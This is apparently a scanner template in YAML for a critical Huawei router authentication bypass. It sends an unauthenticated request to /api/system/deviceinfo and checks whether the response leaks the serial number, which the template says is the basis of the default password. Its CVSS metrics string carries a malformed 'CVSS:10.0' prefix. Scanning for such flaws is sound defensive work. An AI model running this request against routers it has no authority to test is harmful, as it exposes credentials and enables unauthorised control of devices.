id: huawei-router-auth-bypass
info:
  name: Huawei Router - Authentication Bypass
  author: gy741
  severity: critical
  description: Huawei routers are susceptible to authentication bypass due to the
    default password being the last 8 characters of the device's serial number printed
    on the back.
  reference:
  - https://www.exploit-db.com/exploits/48310
  classification:
    cvss-metrics: CVSS:10.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-288
  tags: auth-bypass,router,edb,huawei
  metadata:
    impact: The impact of the Huawei Router authentication bypass vulnerability is
      that unauthorized users can gain access to sensitive information or control
      over the router's settings and connected devices.
    recommendation: It is recommended to change the default password on Huawei Routers
      to prevent authentication bypass vulnerabilities.
requests:
- raw:
  - 'GET /api/system/deviceinfo HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Referer: {{BaseURL}}

    '
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - DeviceName
    - SerialNumber
    - HardwareVersion
    condition: and
